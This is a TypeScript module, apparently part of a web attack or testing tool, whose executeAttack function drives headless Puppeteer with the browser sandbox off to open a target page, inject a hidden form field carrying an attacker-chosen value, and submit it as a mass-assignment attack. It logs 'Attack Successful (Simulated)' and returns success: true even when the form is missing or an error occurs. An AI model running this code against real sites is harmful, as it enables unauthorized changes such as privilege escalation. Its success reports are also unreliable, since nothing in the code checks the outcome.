import puppeteer from 'puppeteer';

export async function executeAttack(targetUrl: string, payload: any) {
    console.log(`Launching attack on ${targetUrl} with payload`, payload);
    const logs: string[] = [];

    // Launch puppeteer
    const browser = await puppeteer.launch({
        headless: true,
        args: ['--no-sandbox', '--disable-setuid-sandbox']
    });
    const page = await browser.newPage();

    try {
        logs.push(`[CONNECT] Navigating to ${targetUrl}`);
        await page.goto(targetUrl);

        if (payload.type === 'mass-assignment') {
            logs.push(`[INJECT] Injecting hidden field: ${payload.field}=${payload.value}`);

            // Inject hidden input into the first form found
            const injected = await page.evaluate((field, value) => {
                const form = document.querySelector('form');
                if (form) {
                    const input = document.createElement('input');
                    input.type = 'hidden';
                    input.name = field;
                    input.value = value;
                    form.appendChild(input);
                    return true;
                }
                return false;
            }, payload.field, payload.value);

            if (injected) {
                logs.push(`[SUCCESS] Payload injected into DOM.`);
                logs.push(`[ACTION] Submitting form...`);

                await Promise.all([
                    page.waitForNavigation({ timeout: 5000 }).catch(() => logs.push("[WARN] Navigation timeout (might be AJAX)")),
                    page.evaluate(() => {
                        const form = document.querySelector('form');
                        if (form) form.submit();
                    })
                ]);

                logs.push(`[VERIFY] Form submitted. Checking detection...`);
                // In a real scenario, we'd check the response or DB
                logs.push(`[RESULT] Attack Successful (Simulated)`);
            } else {
                logs.push(`[FAIL] No form found to inject.`);
            }
        }

    } catch (error: any) {
        logs.push(`[ERROR] Attack failed: ${error.message}`);
    } finally {
        await browser.close();
    }

    return { success: true, logs };
}
